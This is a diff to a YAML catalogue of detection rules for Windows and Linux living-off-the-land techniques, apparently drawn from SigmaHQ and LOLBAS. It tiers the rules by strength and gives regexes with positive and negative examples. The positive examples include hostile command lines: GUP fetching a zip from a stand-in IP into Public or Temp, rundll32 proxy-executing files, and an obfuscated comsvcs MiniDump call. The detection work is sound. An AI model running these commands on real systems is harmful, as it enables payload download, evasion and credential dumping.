@@ -196,6 +196,32 @@
   match:
     anchored: 'GUP\.exe["'']? [^\n]{0,40}-unzipTo [^\n]{0,200}(?:https?|ftp)://'
   case_sensitive: false
+  strength: medium
+  attack: [T1105, T1218]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: File Download Using Notepad++ GUP Utility (Nasreddine Bencherchali, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_gup_download.yml
+    license: DRL-1.1
+    upstream_id: 44143844-0631-49ab-97a0-96387d6b2d7c
+  rationale: >-
+    Notepad++'s updater told to fetch and unzip an arbitrary URL. Notepad++'s own Plugins Admin builds the same
+    command ('GUP.exe -unzipTo [-clean] <npp> <plugins dir> "<folder> <repo URL> <id>"') for every plugin install, and
+    the rule's parent-process exclusion cannot be seen in free text, so it is medium; a destination outside the
+    Notepad++ plugins directory or a URL outside the plugin list's hosts is the lead, and a temp, Public, ProgramData or AppData
+    destination is the separate strong entry.
+  examples:
+    positive:
+      - 'GUP.exe -unzipTo "" "C:\Users\Public" "x http://203.0.113.7/a.zip 0123456789abcdef"'
+    negative:
+      - '"C:\Program Files\Notepad++\updater\GUP.exe" -v8.6.9'
+      - '"C:\Program Files\Notepad++\updater\GUP.exe" -options'
+
+- id: mention.lolbin_gup_unzipto_temp_destination
+  title: Notepad++ GUP -unzipTo text with a URL and a temp, Public, ProgramData or AppData destination
+  match:
+    anchored: 'GUP\.exe["'']? {1,3}-unzipTo (?:-clean )?"[^"\n]{0,120}" {1,3}"(?:[A-Za-z]:\\Temp|[A-Za-z]:\\Users\\Public|[A-Za-z]:\\ProgramData|%TEMP%|%APPDATA%|%PUBLIC%|[A-Za-z]:\\Windows\\Temp|[^"\n]{0,60}\\AppData\\)[^"\n]{0,60}" {1,3}"[^"\n]{0,80}(?:https?|ftp)://'
+  case_sensitive: false
   strength: strong
   attack: [T1105, T1218]
   telemetry: [any]
@@ -205,14 +231,14 @@
     license: DRL-1.1
     upstream_id: 44143844-0631-49ab-97a0-96387d6b2d7c
   rationale: >-
-    Notepad++'s updater told to fetch and unzip an arbitrary URL. The rule excludes runs launched by notepad++.exe;
-    free text cannot see the parent, so an updater line that carries its own URL is the benign look-alike, which
-    normally names the notepad-plus-plus.org update host.
+    The GUP download form with an unzip destination in Temp, Public, ProgramData or AppData. Notepad++'s Plugins
+    Admin always unzips into the Notepad++ plugins directory, so this destination is the abuse; the medium entry
+    covers every other GUP download.
   examples:
     positive:
-      - 'GUP.exe -unzipTo "" "C:\Users\Public" "x http://203.0.113.7/a.zip 0123456789abcdef"'
+      - 'GUP.exe -unzipTo "" "C:\Temp" "x http://203.0.113.7/a.zip 0123456789abcdef"'
     negative:
-      - '"C:\Program Files\Notepad++\updater\GUP.exe" -v8.6.9'
+      - '"C:\Program Files\Notepad++\updater\GUP.exe" -unzipTo -clean "C:\Program Files\Notepad++" "C:\Program Files\Notepad++\plugins" "ComparePlugin https://www.example.com/pnedev/comparePlugin/releases/download/v2.0.2/ComparePlugin_v2.0.2_X64.zip 5a1e2b"'
       - '"C:\Program Files\Notepad++\updater\GUP.exe" -options'
 
 - id: mention.lolbin_onedrive_updater_url_setting
@@ -477,6 +503,32 @@
   match:
     literal: ['zipfldr.dll,RouteTheCall', 'zipfldr,RouteTheCall']
   case_sensitive: false
+  strength: medium
+  attack: [T1218.011]
+  telemetry: [any]
+  source:
+    name: LOLBAS project, Zipfldr.dll
+    url: https://github.com/LOLBAS-Project/LOLBAS/blob/98a39d57b0a3873d635cd5594f2dbffa83891bc3/yml/OSLibraries/Zipfldr.yml
+    license: GPL-3.0
+    upstream_id: Zipfldr.dll
+  rationale: >-
+    The compressed-folder handler's RouteTheCall export launches an arbitrary program (LOLBAS Zipfldr). Older Windows
+    releases registered 'rundll32.exe zipfldr.dll,RouteTheCall %L' as the open handler for zip files, and I cannot
+    rule out current file associations that still do, so it is medium; an executable or script argument is the
+    separate strong entry.
+  examples:
+    positive:
+      - 'rundll32.exe zipfldr.dll,RouteTheCall C:\Users\Public\x.exe'
+      - 'rundll32 zipfldr,RouteTheCall C:\Users\Public\x.exe'
+    negative:
+      - 'explorer.exe C:\Users\alice\Downloads\report.zip'
+      - 'powershell -c "Expand-Archive C:\Temp\a.zip -DestinationPath C:\Temp\a"'
+
+- id: mention.lolbin_rundll32_zipfldr_routethecall_program
+  title: zipfldr RouteTheCall text with an executable or script argument
+  match:
+    anchored: 'zipfldr(?:\.dll)?, {0,1}RouteTheCall {1,3}[^\n]{0,200}\.(?:exe|scr|bat|cmd|com|ps1|vbs|js|hta)\b'
+  case_sensitive: false
   strength: strong
   attack: [T1218.011]
   telemetry: [any]
@@ -486,20 +538,19 @@
     license: GPL-3.0
     upstream_id: Zipfldr.dll
   rationale: >-
-    The compressed-folder handler's RouteTheCall export launches an arbitrary program (LOLBAS Zipfldr). Explorer
-    opens zip folders without a rundll32 command line, so the text has no ordinary use.
+    RouteTheCall given an executable or script instead of a zip file: the LOLBAS proxy-execution form. The legacy
+    zip-file association passes the .zip path being opened, so this argument type separates abuse from the handler.
   examples:
     positive:
       - 'rundll32.exe zipfldr.dll,RouteTheCall C:\Users\Public\x.exe'
-      - 'rundll32 zipfldr,RouteTheCall C:\Users\Public\x.exe'
     negative:
+      - 'rundll32.exe zipfldr.dll,RouteTheCall C:\Users\alice\Downloads\report.zip'
       - 'explorer.exe C:\Users\alice\Downloads\report.zip'
-      - 'powershell -c "Expand-Archive C:\Temp\a.zip -DestinationPath C:\Temp\a"'
 
 - id: mention.lolbin_rundll32_url_dll
-  title: rundll32 url.dll OpenURL or FileProtocolHandler text
+  title: 'url.dll OpenURL or FileProtocolHandler text with a file, UNC or script target'
   match:
-    anchored: 'url\.dll, {0,1}(?:OpenURL|FileProtocolHandler)\b'
+    anchored: 'url\.dll, {0,1}(?:OpenURL|FileProtocolHandler) {1,3}[\"'']?(?:file:|\\\\|[A-Za-z]:\\|%[A-Za-z]{1,20}%|[^\s\"]{0,200}\.(?:hta|exe|url|vbs|js|bat|cmd|ps1|scr|lnk|dll)\b)'
   case_sensitive: false
   strength: medium
   attack: [T1218.011]
@@ -511,12 +562,35 @@
     upstream_id: Url.dll
   rationale: >-
     url.dll's OpenURL and FileProtocolHandler exports open whatever they are given, including .hta and .exe files
-    (LOLBAS Url). Applications also use FileProtocolHandler to open web links in the default browser, so it is
-    medium; a local executable or HTA argument is the lead.
+    (LOLBAS Url). With a file:, UNC, drive or script/executable target it is proxy execution, medium. Applications
+    open web links in the default browser the same way, so an http(s) target is the separate weak entry.
   examples:
     positive:
       - 'rundll32.exe url.dll,OpenURL C:\Users\Public\x.hta'
       - 'rundll32.exe url.dll,FileProtocolHandler C:\Users\Public\x.exe'
+    negative:
+      - 'rundll32.exe shell32.dll,OpenAs_RunDLL C:\Temp\a.log'
+      - 'C:\Windows\System32\rundll32.exe C:\Windows\System32\printui.dll,PrintUIEntry /il'
+
+- id: mention.lolbin_rundll32_url_dll_any
+  title: url.dll OpenURL or FileProtocolHandler text
+  match:
+    anchored: 'url\.dll, {0,1}(?:OpenURL|FileProtocolHandler)\b'
+  case_sensitive: false
+  strength: weak
+  attack: [T1218.011]
+  telemetry: [any]
+  source:
+    name: LOLBAS project, Url.dll
+    url: https://github.com/LOLBAS-Project/LOLBAS/blob/98a39d57b0a3873d635cd5594f2dbffa83891bc3/yml/OSLibraries/Url.yml
+    license: GPL-3.0
+    upstream_id: Url.dll
+  rationale: >-
+    Any url.dll open call. Applications use it to open web links in the default browser, so with an http(s) target
+    it is a weak candidate; the medium entry covers file, UNC and script targets.
+  examples:
+    positive:
+      - 'rundll32.exe url.dll,FileProtocolHandler https://intranet.example.org/'
     negative:
       - 'rundll32.exe shell32.dll,OpenAs_RunDLL C:\Temp\a.log'
       - 'C:\Windows\System32\rundll32.exe C:\Windows\System32\printui.dll,PrintUIEntry /il'
@@ -569,9 +643,9 @@
       - 'rundll32.exe shell32.dll,Control_RunDLL appwiz.cpl'
 
 - id: mention.lolbin_rundll32_shellexec_rundll
-  title: rundll32 shell32 ShellExec_RunDLL text
+  title: 'ShellExec_RunDLL text with a temp or user path, comspec or a script host'
   match:
-    literal: ['ShellExec_RunDLL']
+    anchored: 'ShellExec_RunDLL[^\n]{0,200}(?:\\Desktop\\|\\Temp\\|\\Users\\Public\\|comspec|iex|Invoke-|msiexec|odbcconf|regsvr32)'
   case_sensitive: false
   strength: medium
   attack: [T1218.011]
@@ -582,19 +656,22 @@
     license: DRL-1.1
     upstream_id: d87bd452-6da1-456e-8155-7dc988157b7d
   rationale: >-
-    ShellExec_RunDLL starts any program or command line through rundll32 (LOLBAS Shell32), breaking the parent chain.
-    Some shell integrations call it, so it is medium; the rule's high form adds temp paths or script hosts.
+    The rule's scope: ShellExec_RunDLL starting something from Desktop, Temp or Public, or handing off to comspec,
+    iex, Invoke-*, msiexec, odbcconf or regsvr32 (LOLBAS Shell32). Settings and URL handlers ('ms-settings:') use the
+    same export and are not matched. The rule rates it high; a few shell integrations launch from Desktop, so it is
+    medium.
   examples:
     positive:
       - 'rundll32 SHELL32.DLL,ShellExec_RunDLL C:\Users\Public\x.exe'
     negative:
       - 'rundll32.exe shell32.dll,Control_RunDLL appwiz.cpl'
       - 'rundll32.exe shell32.dll,OpenAs_RunDLL C:\Temp\a.log'
+      - 'rundll32.exe shell32.dll,ShellExec_RunDLL "ms-settings:windowsupdate"'
 
 - id: mention.lolbin_rundll32_ordinal_call
-  title: rundll32 text with an ordinal export reference
+  title: 'rundll32 text with a DLL path and an ordinal export reference'
   match:
-    anchored: 'rundll32(?:\.exe)?["'']? [^\n]{1,200}, {0,1}#[-+]?[0-9]{1,5}\b'
+    anchored: 'rundll32(?:\.exe)?[\"'']? {1,3}[\"'']?[^\n\", ]{0,150}[\\/][^\n\", \\/]{1,80}\.(?:dll|ocx|cpl|exe|tmp|dat|bin)[\"'']?, {0,1}#[-+]?[0-9]{1,5}\b'
   case_sensitive: false
   strength: medium
   attack: [T1218.011]
@@ -605,21 +682,68 @@
     license: DRL-1.1
     upstream_id: e79a9e79-eb72-4e78-a628-0e7e8f59e89c
   rationale: >-
-    Calling an export by number hides which function runs and is common in loader DLLs (and in the obfuscated
-    '#-', '#+' and padded forms of rule 43fa5350-db63-4b8f-9a01-789a427074e1). Build tools and EdgeHTML also call
-    exports by ordinal, so it is medium.
+    Calling an export by number hides which function runs and is common in loader DLLs dropped on disk. This entry
+    needs a DLL given with a path; bare system DLL names such as 'shell32.dll,#61' (the Run dialog) are the weak
+    entry. Build tools and EdgeHTML also call exports by ordinal from full paths, so it is medium.
   examples:
     positive:
       - 'rundll32.exe C:\Users\Public\x.dll,#2'
+      - 'rundll32.exe "C:\ProgramData\a\b.dat",#1'
+    negative:
+      - 'rundll32.exe shell32.dll,#61'
+      - 'rundll32.exe C:\Windows\System32\printui.dll,PrintUIEntry /il'
+
+- id: mention.lolbin_rundll32_obfuscated_ordinal
+  title: 'rundll32 text with an obfuscated-form ordinal (#-, #+, #0, #655xx)'
+  match:
+    anchored: 'rundll32(?:\.exe)?["'']? [^\n]{1,200}, {0,1}#(?:[-+][0-9]|0[0-9]|65[56][0-9])'
+  case_sensitive: false
+  strength: medium
+  attack: [T1218.011, T1027]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Potential Obfuscated Ordinal Call Via Rundll32 (Nasreddine Bencherchali, Swachchhanda Shrawan Poudel, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_rundll32_obfuscated_ordinal_call.yml
+    license: DRL-1.1
+    upstream_id: 43fa5350-db63-4b8f-9a01-789a427074e1
+  rationale: >-
+    Ordinals written as '#-', '#+', zero-padded or wrapped past 65535 resolve to the same export but evade rules that
+    look for a specific number (comsvcs MiniDump #24 is the usual target). Legitimate callers write plain ordinals,
+    so it is medium as upstream.
+  examples:
+    positive:
+      - 'rundll32.exe comsvcs.dll,#+24 624 C:\Users\Public\l.dmp full'
+    negative:
+      - 'rundll32.exe shell32.dll,#61'
+      - 'rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL desk.cpl'
+
+- id: mention.lolbin_rundll32_ordinal_bare
+  title: rundll32 text with a bare DLL name and an ordinal export reference
+  match:
+    anchored: 'rundll32(?:\.exe)?["'']? {1,3}["'']?[A-Za-z0-9_.-]{1,60}\.(?:dll|ocx|cpl)["'']?, {0,1}#[0-9]{1,5}\b'
+  case_sensitive: false
+  strength: weak
+  attack: [T1218.011]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: DLL Call by Ordinal Via Rundll32.EXE (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules-threat-hunting/windows/process_creation/proc_creation_win_rundll32_by_ordinal.yml
+    license: DRL-1.1
+    upstream_id: e79a9e79-eb72-4e78-a628-0e7e8f59e89c
+  rationale: >-
+    A system DLL called by ordinal without a path. Windows itself uses forms such as 'shell32.dll,#61' (the Run
+    dialog) and 'shell32.dll,#44', so it is a weak candidate; the arguments after the ordinal decide.
+  examples:
+    positive:
       - 'rundll32.exe shell32.dll,#44 C:\Users\Public\x.dll'
     negative:
       - 'rundll32.exe C:\Windows\System32\printui.dll,PrintUIEntry /il'
-      - 'rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL desk.cpl'
+      - 'rundll32.exe shell32.dll,Control_RunDLL appwiz.cpl'
 
 - id: mention.lolbin_expand_cab_to_user_path
-  title: 'expand -F: text with a user, temp or admin-share destination'
+  title: 'expand -F: text with a user, ProgramData or admin-share destination'
   match:
-    anchored: 'expand(?:\.exe)?["'']? [^\n]{0,200}[-/]F:[^\n]{0,150}(?::\\Perflogs\\|:\\ProgramData|:\\Users\\Public\\|:\\Windows\\Temp\\|\\Admin\$\\|\\AppData\\Local\\Temp\\|\\AppData\\Roaming\\|\\C\$\\)'
+    anchored: 'expand(?:\.exe)?[\"'']? [^\n]{0,200}[-/]F:[^\n]{0,150}(?::\\Perflogs\\|:\\ProgramData|:\\Users\\Public\\|\\Admin\$\\|\\AppData\\Local\\Temp\\|\\AppData\\Roaming\\|\\C\$\\)'
   case_sensitive: false
   strength: medium
   attack: [T1140, T1105]
@@ -630,14 +754,40 @@
     license: DRL-1.1
     upstream_id: 9f107a84-532c-41af-b005-8d12a607639f
   rationale: >-
-    Expanding a cabinet into ProgramData, Public, Windows\Temp, AppData or an admin share is how CAB-packed payloads
-    are unpacked (LOLBAS Expand). Vendor updaters (the rule excludes a Dell updater) do it too, so it is medium.
+    Expanding a cabinet into ProgramData, Public, AppData or an admin share is how CAB-packed payloads are unpacked
+    (LOLBAS Expand). Vendor updaters (the rule excludes a Dell updater) do it too, so it is medium. The rule's
+    C:\Windows\Temp destination is where Windows Update and servicing stage KB cabinets, so it is the separate weak
+    entry.
   examples:
     positive:
       - 'expand C:\Users\Public\a.cab -F:* C:\ProgramData\x'
     negative:
       - 'expand D:\Drivers\net.cab -F:* D:\Drivers\net'
       - 'Nov 21 10:07:00 ws01 TrustedInstaller: Windows Update package KB5032189 expanded'
+      - 'expand C:\Windows\Temp\KB5032189.cab -F:* C:\Windows\Temp\KB5032189'
+
+- id: mention.lolbin_expand_cab_to_windows_temp
+  title: 'expand -F: text with a C:\Windows\Temp destination'
+  match:
+    anchored: 'expand(?:\.exe)?["'']? [^\n]{0,200}[-/]F:[^\n]{0,150}:\\Windows\\Temp\\'
+  case_sensitive: false
+  strength: weak
+  attack: [T1140, T1105]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Potentially Suspicious Cabinet File Expansion (Bhabesh Raj, X__Junior, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_expand_cabinet_files.yml
+    license: DRL-1.1
+    upstream_id: 9f107a84-532c-41af-b005-8d12a607639f
+  rationale: >-
+    The rule's Windows\Temp destination. Windows Update and servicing expand KB cabinets there routinely, so it is a
+    weak candidate; a non-KB cabinet name or an unusual parent decides.
+  examples:
+    positive:
+      - 'expand C:\Users\Public\a.cab -F:* C:\Windows\Temp\x'
+    negative:
+      - 'expand D:\Drivers\net.cab -F:* D:\Drivers\net'
+      - 'expand -D C:\Windows\Temp\KB5032189.cab'
 
 - id: mention.lolbin_finger_to_shell
   title: finger output with a pipe into cmd or PowerShell
@@ -709,9 +859,9 @@
       - 'Nov 21 10:10:02 bsd01 sh[702]: echo hello | b64encode -r -'
 
 - id: mention.lolbin_python_base64_subprocess
-  title: python -c text with base64 decode and subprocess, os.system or exec
+  title: 'python -c text with base64 decode and shell=True, os.system, exec or a -c string'
   match:
-    anchored: 'python[0-9.]{0,4} {1,3}-c {1,3}["''][^\n]{0,40}import base64[^\n]{0,300}(?:subprocess|os\.system|exec\()'
+    anchored: 'python[0-9.]{0,4} {1,3}-c {1,3}[\"''][^\n]{0,40}import base64[^\n]{0,250}(?:shell {0,2}= {0,2}True|os\.system\(|exec\(|[\"'']-c[\"''])'
   case_sensitive: false
   strength: medium
   attack: [T1140, T1059.006]
@@ -722,11 +872,13 @@
     license: DRL-1.1
     upstream_id: 55e862a8-dd9c-4651-807a-f21fcad56716
   rationale: >-
-    The rule's python -c base64 one-liner with an execution sink on the same line: decoded (often XOR-masked) text
-    handed to subprocess, os.system or exec. Data scripts decode base64 but rarely run the result, so it is medium.
+    The rule's python -c base64 one-liner with a code-running sink on the same line: subprocess with shell=True,
+    os.system, exec, or a shell given a '-c' string. Passing decoded bytes as data (input=, a file) is not matched.
+    Data scripts decode base64 but rarely run the result, so it is medium.
   examples:
     positive:
       - 'Nov 21 10:11:00 lnx01 bash[703]: HISTORY: python3 -c ''import base64, subprocess; subprocess.run(base64.b64decode("aWQ=").decode(), shell=True)'''
     negative:
       - 'Nov 21 10:11:01 lnx01 bash[704]: HISTORY: python3 -c ''import base64; print(base64.b64decode("aGk=").decode())'''
       - 'Nov 21 10:11:02 lnx01 bash[705]: HISTORY: python3 -m pip install --upgrade pip'
+      - 'Nov 21 10:11:03 lnx01 bash[706]: HISTORY: python3 -c ''import base64, subprocess; subprocess.run(["gpg", "--import"], input=base64.b64decode(open("k.b64").read()))'''
